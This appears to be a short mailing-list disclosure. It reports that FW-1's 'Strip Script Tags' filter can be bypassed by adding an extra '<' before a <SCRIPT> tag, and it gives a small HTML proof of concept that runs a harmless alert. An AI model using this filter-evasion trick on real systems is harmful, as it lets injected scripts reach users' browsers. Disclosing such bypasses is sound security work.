Hi all,

The "Strip Script Tags" in FW-1 can be circumvented by adding an extra <
before the <SCRIPT> tag like in this code:

<HTML>
<HEAD>
<<SCRIPT LANGUAGE="JavaScript">
alert("hello world")
</SCRIPT>
</HEAD>
<BODY>
test
</BODY>
</HTML>

This code will pass unchanged, and still execute in both Navigator and
Explorer. I tried this on version 3.0 of FW-1 (on Windows NT 4.0) but I'm
not able to check it on version 4.0 since I don't have access to it.
